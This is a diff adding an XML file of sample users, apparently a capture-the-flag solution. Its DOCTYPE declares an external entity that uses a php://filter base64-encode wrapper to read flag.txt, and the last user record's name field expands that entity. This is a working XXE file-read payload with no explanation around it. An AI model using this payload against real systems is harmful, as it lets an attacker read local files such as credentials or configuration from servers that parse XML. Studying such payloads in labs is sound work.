@@ -1,0 +1,29 @@
+<?xml version='1.0' encoding="ISO-8859-1"?>
+<!DOCTYPE foo [<!ENTITY example SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt"> ]>
+
+<users>
+    <user>
+        <name>Jean</name>
+        <email>jean@test.com</email>
+    </user>
+
+    <user>
+        <name>Pierre</name>
+        <email>pierre@test.com</email>
+    </user>
+
+    <user>
+        <name>Paul</name>
+        <email>paul@test.com</email>
+    </user>
+    
+    <user>
+        <name>Jacque</name>
+        <email>jacque@test.com</email>
+  </user>
+<user>
+ <name>&example;</name>
+ <email>&#x0A;</email>
+</user>
+
+</users>
